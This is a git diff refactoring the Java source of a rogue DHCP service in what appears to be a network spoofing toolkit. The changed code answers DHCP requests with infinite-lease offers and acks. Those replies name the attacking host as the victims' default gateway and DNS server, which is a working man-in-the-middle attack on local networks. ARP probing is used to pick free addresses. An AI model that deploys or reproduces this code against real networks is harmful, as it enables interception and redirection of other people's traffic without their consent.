@@ -1,6 +1,5 @@
 package org.bitducks.spoofing.services.dhcprogue;
 
-import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.Collection;
@@ -12,20 +11,16 @@ import java.util.List;
 import java.util.Set;
 import java.util.Timer;
 
-import jpcap.JpcapCaptor;
-import jpcap.NetworkInterface;
-import jpcap.NetworkInterfaceAddress;
-import jpcap.packet.ARPPacket;
 import jpcap.packet.EthernetPacket;
 import jpcap.packet.IPPacket;
 import jpcap.packet.Packet;
 import jpcap.packet.UDPPacket;
 
+import org.bitducks.spoofing.core.InterfaceInfo;
 import org.bitducks.spoofing.core.Policy;
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.core.rules.DHCPRule;
-import org.bitducks.spoofing.packet.PacketFactory;
 import org.bitducks.spoofing.scan.ArpRecieveService;
 import org.bitducks.spoofing.scan.ArpScanFinish;
 import org.bitducks.spoofing.scan.ArpScanService;
@@ -40,19 +35,19 @@ import org.dhcp4java.DHCPResponseFactory;
 public class RogueDHCPService extends Service implements ArpScanFinish {
 
 	/**
-	 * The available IP address
+	 * The information about the current host
 	 */
-	private Iterator<InetAddress> range;
-
-	/**
-	 * The network interface
-	 */
-	private NetworkInterface device;
+	private InterfaceInfo info = Server.getInstance().getInfo();
 
 	/**
 	 * The address of the server
 	 */
-	private InetAddress server;
+	private InetAddress DHCPServerIP = this.info.getAddress();
+
+	/**
+	 * The available IP address
+	 */
+	private Iterator<InetAddress> range;
 
 	/**
 	 * The address of the clients who has disconnected
@@ -65,30 +60,25 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 	private Set<InetAddress> givenAdresses = Collections.synchronizedSet(new HashSet<InetAddress>());
 
 	private Timer timer = new Timer();
-	
+
 	private ArpScanService arpScan = new ArpScanService();
-	
+
 	private ArpRecieveService receiver = new ArpRecieveService();
-	
+
 	private ArpFreeAddressService arpSender = new ArpFreeAddressService();
-	
+
 	public static final int TIME_TO_CHECK_IP = 10 * 1000; //60 * 60 * 1000; //For 1 hour
 
 	public RogueDHCPService() {
 		Policy policy = this.getPolicy();
 		policy.addRule(new DHCPRule());
 
-		this.device = Server.getInstance().getNetworkInterface();
-
-		NetworkInterfaceAddress deviceAddress = this.device.addresses[0];
-
-		this.server = deviceAddress.address;
 		this.range = new IpRange(
-				IpUtil.network(deviceAddress), 
-				IpUtil.lastIpInNetwork2(deviceAddress))
+				IpUtil.network(this.info.getDeviceAddress()), 
+				IpUtil.lastIpInNetwork2(this.info.getDeviceAddress()))
 		.iterator();
 		this.range.next();
-		
+
 		Server.getInstance().addService(this.arpScan);
 		Server.getInstance().addService(this.receiver);
 		Server.getInstance().addService(this.arpSender);
@@ -100,7 +90,7 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 
 		while(!this.isCloseRequested()) {
 			Packet p = this.getNextBlockingPacket();
-			
+
 			if(p != null) {
 				try {
 					DHCPPacket dhcp = DHCPPacket.getPacket(p.data, 0, p.data.length, false);
@@ -127,17 +117,20 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 			offer = this.getAddressOffer();
 			this.givenAdresses.add(offer);
 		} while(this.arpSender.sendARP(offer, 100)); //While the arp request has a reply, we take the next address
-		
-		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, offer, 0xffffffff, this.server, "", null);
+
+		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, offer, 0xffffffff, this.DHCPServerIP, "", null);
 
 		this.sendDHCPPacket(dhcpOffer);
 	}
 
 	private void makeAck(DHCPPacket dhcp) throws UnknownHostException {
 		InetAddress ip = dhcp.getOptionAsInetAddr((byte) 50);
-		DHCPPacket dhcpAck = DHCPResponseFactory.makeDHCPAck(dhcp, ip, 0xffffffff, this.server, "", null);
+		//It might be null if the client just ask for a new dhcp lease, so we don't reply because our lease is infinite.
+		if(ip != null) { 
+			DHCPPacket dhcpAck = DHCPResponseFactory.makeDHCPAck(dhcp, ip, 0xffffffff, this.DHCPServerIP, "", null);
 
-		this.sendDHCPPacket(dhcpAck);
+			this.sendDHCPPacket(dhcpAck);
+		}
 	}
 
 	private void sendDHCPPacket(DHCPPacket dhcp) throws UnknownHostException {
@@ -156,7 +149,7 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 	private EthernetPacket getEthernetHeader() {
 		EthernetPacket ether = new EthernetPacket();
 		ether.frametype = EthernetPacket.ETHERTYPE_IP;
-		ether.src_mac = this.device.mac_address;
+		ether.src_mac = this.info.getMacAddress();
 		ether.dst_mac = Constants.BROADCAST;
 		return ether;
 	}
@@ -174,22 +167,22 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 				0, 						// Identifier
 				64, 					// TTL
 				IPPacket.IPPROTO_UDP,  	// Protocol
-				this.server,
+				this.DHCPServerIP,
 				InetAddress.getByAddress(new byte[] {(byte) 255, (byte) 255, (byte) 255, (byte) 255}));
 	}
 
 	private void setDHCPOption(DHCPPacket dhcp) {
 		// Subnet mask address
-		dhcp.setOptionRaw((byte) 1, this.device.addresses[0].subnet.getAddress());
+		dhcp.setOptionRaw((byte) 1, this.info.getSubnet().getAddress());
 
 		// Broadcast IP Address 
-		dhcp.setOptionRaw((byte) 28, this.device.addresses[0].broadcast.getAddress());
+		dhcp.setOptionRaw((byte) 28, this.info.getBroadcast().getAddress());
 
 		// Gateway
-		dhcp.setOptionAsInetAddress((byte) 3, this.server);
+		dhcp.setOptionAsInetAddress((byte) 3, this.DHCPServerIP);
 
 		//DNS Server
-		dhcp.setOptionAsInetAddresses((byte) 6, new InetAddress[] {this.server, this.server});
+		dhcp.setOptionAsInetAddresses((byte) 6, new InetAddress[] {this.DHCPServerIP, this.DHCPServerIP});
 	}
 
 	private InetAddress getAddressOffer() {
@@ -205,7 +198,7 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 		this.givenAdresses.removeAll(address);
 		this.timer.schedule(new HostDown(this, this.givenAdresses), RogueDHCPService.TIME_TO_CHECK_IP);
 	}*/
-	
+
 	@Override
 	public void scanFinished(Collection<InetAddress> addresses) {
 		System.out.println("Free address: " + this.freeAddress.toString());
@@ -234,7 +227,7 @@ public class RogueDHCPService extends Service implements ArpScanFinish {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		
+
 		return false;
 	}*/
 }
